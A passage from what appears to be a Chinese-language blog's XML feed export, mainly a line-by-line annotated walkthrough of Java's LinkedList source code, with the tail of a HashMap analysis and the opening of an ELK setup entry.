class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">            Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                Objects.equals(value, e.getValue()))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li><p>元素：插入无序，循环输出有序，相同key会覆盖旧值，key、value均可为null，不可以直接使用迭代器遍历，可间接遍历。</p>
</li>
<li><p>效率：通过数组 +（单链表或红黑树）实现，key的hash值计算和Node数组下标计算均采用位运算符，因而增、删、改、查效率都较高。</p>
</li>
<li><p>安全性：线程不安全。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>HashMap</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>LinkedList源码分析</title>
    <url>/2023/02/02/$LinkedList%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-new-LinkedList"><a href="#1-new-LinkedList" class="headerlink" title="1. new LinkedList()"></a>1. new LinkedList()</h1><p>初始化一个空链表，此时头节点first、尾节点last均为null，由Node内部类可看出，LinkedList是一个双向链表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; first;</span><br><span class="line"></span><br><span class="line"><span class="keyword">transient</span> Node&lt;E&gt; last;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="comment">// 真正的数据存放在节点的item中</span></span><br><span class="line">    E item;</span><br><span class="line">    Node&lt;E&gt; next;</span><br><span class="line">    Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">        <span class="built_in">this</span>.item = element;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">        <span class="built_in">this</span>.prev = prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-new-LinkedList-Collection-c"><a href="#2-new-LinkedList-Collection-c" class="headerlink" title="2. new LinkedList(Collection&lt;? extends E&gt; c)"></a>2. new LinkedList(Collection&lt;? extends E&gt; c)</h1><p>把旧集合的元素添加到新集合中，值得注意的是，node(int index)方法为通过下标找到双链表中对应的节点Node，下标小于size&#x2F;2，从头节点遍历，反之，从尾节点遍历，找到下标为index的元素并返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LinkedList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    <span class="comment">// 第1点中的无参构造</span></span><br><span class="line">    <span class="built_in">this</span>();</span><br><span class="line">    addAll(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addAll(size, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(<span class="type">int</span> index, Collection&lt;? extends E&gt; c)</span> &#123;</span><br><span class="line">    <span class="comment">// index不能小于0或大于size</span></span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line"></span><br><span class="line">    Object[] a = c.toArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">numNew</span> <span class="operator">=</span> a.length;</span><br><span class="line">    <span class="keyword">if</span> (numNew == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    Node&lt;E&gt; pred, succ;</span><br><span class="line">    <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">        <span class="comment">// index与size相等，说明：待插入元素将从链表末尾插入，下一个元素为null，上一个元素为最后一个元素last</span></span><br><span class="line">        succ = <span class="literal">null</span>;</span><br><span class="line">        pred = last;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// index与size不相等，先找到下一个元素（这里为下标为index的元素），上一个元素为找到元素的上一个节点元素</span></span><br><span class="line">        succ = node(index);</span><br><span class="line">        pred = succ.prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环创建节点，并从pred节点后、succ节点前插入。结果：pred &lt;=&gt; e1 &lt;=&gt; e2 &lt;=&gt; eN &lt;=&gt; succ</span></span><br><span class="line">    <span class="keyword">for</span> (Object o : a) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span> <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) o;</span><br><span class="line">        <span class="comment">// 创建上一个节点为pred、下一个节点为null的节点</span></span><br><span class="line">        Node&lt;E&gt; newNode = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(pred, e, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// 上一个节点为null，说明当前节点为头节点</span></span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 反之，上一个节点的下一个节点为当前节点，此时：当前节点的上一个节点和上一个节点的下一个节点均绑定好</span></span><br><span class="line">            pred.next = newNode;</span><br><span class="line">        <span class="comment">// 把当前节点置为上一个节点，放入循环中</span></span><br><span class="line">        pred = newNode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (succ == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 说明插入节点在最后，尾节点即pred（在循环插入中，指向为最后插入的新节点，即为尾节点）</span></span><br><span class="line">        last = pred;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 新插入节点的下一个节点为下标index的节点succ</span></span><br><span class="line">        pred.next = succ;</span><br><span class="line">        <span class="comment">// 下标为succ节点的上一个节点为新插入节点</span></span><br><span class="line">        succ.prev = pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 容器大小增加numNew</span></span><br><span class="line">    size += numNew;</span><br><span class="line">    <span class="comment">// 结构修改的次数（引发集合大小size改变的修改次数）+1</span></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查index：不能小于0或大于size</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkPositionIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!isPositionIndex(index))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(outOfBoundsMsg(index));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isPositionIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到下标为index的节点，小于size/2，从头节点遍历，反之从尾节点遍历</span></span><br><span class="line">Node&lt;E&gt; <span class="title function_">node</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// assert isElementIndex(index);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">        Node&lt;E&gt; x = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">            x = x.next;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;E&gt; x = last;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">            x = x.prev;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-add-E-e"><a href="#3-add-E-e" class="headerlink" title="3. add(E e)"></a>3. add(E e)</h1><p>从双链表尾部插入新元素节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    linkLast(e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从尾部插入新节点</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">linkLast</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="comment">// 新节点上一个节点为l（即插入前的last节点）</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(l, e, <span class="literal">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="literal">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 插入前last节点的下一个节点为新节点</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-add-int-index-E-element"><a href="#4-add-int-index-E-element" class="headerlink" title="4. add(int index, E element)"></a>4. add(int index, E element)</h1><p>插入到指定下标节点前，使其成为新的index下标节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="comment">// index不能小于0或大于size</span></span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index == size)</span><br><span class="line">        <span class="comment">// 从尾部插入新节点，第3点分析过</span></span><br><span class="line">        linkLast(element);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 在下标为index节点前插入，插入节点为新的index节点，node(index)在第2点分析过</span></span><br><span class="line">        linkBefore(element, node(index));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">linkBefore</span><span class="params">(E e, Node&lt;E&gt; succ)</span> &#123;</span><br><span class="line">    <span class="comment">// assert succ != null;</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">    <span class="comment">// 指定下标的上一个节点为新节点的上一个节点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(pred, e, succ);</span><br><span class="line">    <span class="comment">// 指点下标节点的上一个节点为新节点</span></span><br><span class="line">    succ.prev = newNode;</span><br><span class="line">    <span class="keyword">if</span> (pred == <span class="literal">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 指定下标原上一个节点的下一个节点为新节点</span></span><br><span class="line">        pred.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-remove-int-index"><a href="#5-remove-int-index" class="headerlink" title="5. remove(int index)"></a>5. remove(int index)</h1><p>删除指定下标节点，并返回节点数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法，允许范围：[0, size)</span></span><br><span class="line">    checkElementIndex(index);</span><br><span class="line">    <span class="comment">// 删除指定节点，并返回节点数据，node(index)在第2点分析过</span></span><br><span class="line">    <span class="keyword">return</span> unlink(node(index));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkElementIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!isElementIndex(index))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(outOfBoundsMsg(index));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isElementIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> index &gt;= <span class="number">0</span> &amp;&amp; index &lt; size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除节点x</span></span><br><span class="line">E <span class="title function_">unlink</span><span class="params">(Node&lt;E&gt; x)</span> &#123;</span><br><span class="line">    <span class="comment">// assert x != null;</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">E</span> <span class="variable">element</span> <span class="operator">=</span> x.item;</span><br><span class="line">    <span class="comment">// 被删除的下一个节点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = x.next;</span><br><span class="line">    <span class="comment">// 被删除的上一个节点</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 说明被删除的节点为首节点，即头节点置为next</span></span><br><span class="line">        first = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 上一个节点的下一个节点置为next</span></span><br><span class="line">        prev.next = next;</span><br><span class="line">        <span class="comment">// 被删除节点上一个节点置为null</span></span><br><span class="line">        x.prev = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 说明被删除节点为尾节点，即尾节点为prev</span></span><br><span class="line">        last = prev;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 下一个节点的上一个节点置为prev</span></span><br><span class="line">        next.prev = prev;</span><br><span class="line">        <span class="comment">// 被删除节点的下一个节点置为null</span></span><br><span class="line">        x.next = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 被删除节点数据置为null</span></span><br><span class="line">    x.item = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 容器大小减1</span></span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-remove-Object-o"><a href="#6-remove-Object-o" class="headerlink" title="6. remove(Object o)"></a>6. remove(Object o)</h1><p>删除第1个指定元素（从下标0开始），返回值：true - 删除成功；false - 删除失败。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="literal">null</span>; x = x.next) &#123;</span><br><span class="line">            <span class="comment">// 被删除元素为null，通过==判断</span></span><br><span class="line">            <span class="keyword">if</span> (x.item == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 第5分析过</span></span><br><span class="line">                unlink(x);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;E&gt; x = first; x != <span class="literal">null</span>; x = x.next) &#123;</span><br><span class="line">            <span class="comment">// 被删除元素不为null，通过equals判断</span></span><br><span class="line">            <span class="keyword">if</span> (o.equals(x.item)) &#123;</span><br><span class="line">                unlink(x);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-set-int-index-E-element"><a href="#7-set-int-index-E-element" class="headerlink" title="7. set(int index, E element)"></a>7. set(int index, E element)</h1><p>修改下标对应的元素值，先找到下标对应的节点Node，保存旧值，替换旧值，最后返回旧值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查index是否合法，允许范围：[0, size)</span></span><br><span class="line">    checkElementIndex(index);</span><br><span class="line">    <span class="comment">// 找到下标index的节点</span></span><br><span class="line">    Node&lt;E&gt; x = node(index);</span><br><span class="line">    <span class="comment">// 旧数据值</span></span><br><span class="line">    <span class="type">E</span> <span class="variable">oldVal</span> <span class="operator">=</span> x.item;</span><br><span class="line">    <span class="comment">// 设入新值</span></span><br><span class="line">    x.item = element;</span><br><span class="line">    <span class="keyword">return</span> oldVal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-get-int-index"><a href="#8-get-int-index" class="headerlink" title="8. get(int index)"></a>8. get(int index)</h1><p>根据下标找到对应元素值，先找到对应的节点Node，再找其item属性值（真正的数据存放在节点的item中）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    checkElementIndex(index);</span><br><span class="line">    <span class="keyword">return</span> node(index).item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="9-size"><a href="#9-size" class="headerlink" title="9. size()"></a>9. size()</h1><p>返回集合元素个数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-迭代器-iterator"><a href="#10-迭代器-iterator" class="headerlink" title="10. 迭代器 - iterator()"></a>10. 迭代器 - iterator()</h1><p>modCount用于保证使用迭代器来删除元素的同时，不进行其它的结构化操作（add&#x2F;remove等），因此在循环删除元素的操作中，最好使用迭代器来删除元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LinkedList继承AbstractSequentialList，后者继承AbstractList。list.iterator()调用栈：</span></span><br><span class="line"><span class="comment">// java.util.AbstractSequentialList#iterator</span></span><br><span class="line"><span class="comment">// 		java.util.AbstractList#listIterator()</span></span><br><span class="line"><span class="comment">// 			java.util.AbstractList#listIterator(int)	（LinkedList中提供了具体实现）</span></span><br><span class="line"><span class="comment">//			java.util.LinkedList#listIterator    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// java.util.AbstractSequentialList#iterator</span></span><br><span class="line"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> listIterator();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.util.AbstractList#listIterator()</span></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> listIterator(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.util.AbstractList#listIterator(int)		（LinkedList中提供了具体实现）</span></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ListItr</span>(index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.util.LinkedList#listIterator	（LinkedList的实现，实际调用的方法）</span></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="comment">// index不能小于0或大于size，第2点分析过</span></span><br><span class="line">    checkPositionIndex(index);</span><br><span class="line">    <span class="comment">// 传入的index为0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ListItr</span>(index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>java.util.LinkedList.ListItr</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">ListItr</span> <span class="keyword">implements</span> <span class="title class_">ListIterator</span>&lt;E&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> Node&lt;E&gt; lastReturned;</span><br><span class="line">        <span class="keyword">private</span> Node&lt;E&gt; next;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> nextIndex;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line"></span><br><span class="line">        ListItr(<span class="type">int</span> index) &#123;</span><br><span class="line">            <span class="comment">// assert isPositionIndex(index);</span></span><br><span class="line">            <span class="comment">// index == size说明下一个节点为null，否则找到index节点以备下次next()使用</span></span><br><span class="line">            next = (index == size) ? <span class="literal">null</span> : node(index);</span><br><span class="line">            <span class="comment">// 记录index为nextIndex</span></span><br><span class="line">            nextIndex = index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &lt; size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// modCount与expectedModCount两个修改次数需要保持一致，避免iterator时，通过add/remove修改容器</span></span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasNext())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拿到构造器中保存的next节点</span></span><br><span class="line">            lastReturned = next;</span><br><span class="line">            <span class="comment">// 下一个节点更新为next节点</span></span><br><span class="line">            next = next.next;</span><br><span class="line">            <span class="comment">// nextIndex+1</span></span><br><span class="line">            nextIndex++;</span><br><span class="line">            <span class="comment">// 返回构造器中保存的next节点的item数据</span></span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPrevious</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex &gt; <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">previous</span><span class="params">()</span> &#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (!hasPrevious())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line"></span><br><span class="line">            lastReturned = next = (next == <span class="literal">null</span>) ? last : next.prev;</span><br><span class="line">            nextIndex--;</span><br><span class="line">            <span class="keyword">return</span> lastReturned.item;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nextIndex</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">previousIndex</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> nextIndex - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line"></span><br><span class="line">            Node&lt;E&gt; lastNext = lastReturned.next;</span><br><span class="line">            unlink(lastReturned);</span><br><span class="line">            <span class="keyword">if</span> (next == lastReturned)</span><br><span class="line">                next = lastNext;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nextIndex--;</span><br><span class="line">            lastReturned = <span class="literal">null</span>;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(E e)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (lastReturned == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned.item = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            lastReturned = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="literal">null</span>)</span><br><span class="line">                linkLast(e);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                linkBefore(e, next);</span><br><span class="line">            nextIndex++;</span><br><span class="line">            expectedModCount++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> E&gt; action)</span> &#123;</span><br><span class="line">            Objects.requireNonNull(action);</span><br><span class="line">            <span class="keyword">while</span> (modCount == expectedModCount &amp;&amp; nextIndex &lt; size) &#123;</span><br><span class="line">                action.accept(next.item);</span><br><span class="line">                lastReturned = next;</span><br><span class="line">                next = next.next;</span><br><span class="line">                nextIndex++;</span><br><span class="line">            &#125;</span><br><span class="line">            checkForComodification();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">checkForComodification</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li><p>元素：有序，可重复，可为null，可以通过迭代器遍历。</p>
</li>
<li><p>效率：通过双向链表实现。相比用Object数组实现的ArrayList，LinkedList更适合做增、删，不适合做改、查操作。但具体也得看场景，比如：已知列表需要存储元素最大个数，可以在初始化时指定ArrayList大小，避免扩容，也是适合做顺序插入的，同时也能兼顾到修改、查询速率快的优点，这也是ArrayList非常常用的原因。</p>
</li>
<li><p>安全性：线程不安全。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>LinkedList</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>ELK基础使用</title>
    <url>/2020/09/16/ELK%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="1-elasticsearch"><a href="#1-elasticsearch" class="headerlink" title="1. elasticsearch"></a>1. elasticsearch</h1><p>到官网分别下载：elasticsearch-6.4.2.tar.gz, kibana-6.4.2-linux-x86_64.tar.gz, logstash-6.4.2.tar.gz</p>
